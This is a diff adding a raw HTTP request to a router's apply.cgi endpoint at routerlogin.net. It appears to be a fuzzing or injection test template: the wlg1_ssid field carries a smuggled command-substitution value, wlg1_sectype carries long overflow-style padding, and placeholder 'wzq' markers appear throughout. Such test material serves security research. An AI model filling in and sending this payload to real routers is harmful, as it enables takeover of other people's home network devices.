@@ -1,0 +1,6 @@
+GET /apply.cgi?AUTO_download_language.htm timestamp= HTTP/1.1
+Host: routerlogin.net
+Content-Type: application/json
+Content-Length: 224
+
+wlg1_ssid=;$(wzq)&wlg1_sectype=aaaWZQaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaWZQwaaaaaaaaaaaaaaaaaaaaaWZQwaaaaaaaa&wlg1_key_length=\wzq&submit_flag=wan&%20timestamp=wzqwzqwzq
